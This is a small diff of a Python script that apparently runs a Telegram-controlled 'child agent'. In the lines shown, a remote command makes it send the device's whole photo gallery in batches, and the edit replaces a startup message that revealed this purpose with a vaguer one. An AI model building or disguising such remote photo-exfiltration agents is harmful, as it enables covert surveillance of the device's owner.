@@ -81,7 +81,7 @@ async def main():
             await event.answer("Sending all photos in batches...")
             await send_gallery(client)
 
-    print("Child agent online — waiting for parent commands.")
+    print("now you can use.")
     await client.run_until_disconnected()
 
 if __name__ == "__main__":
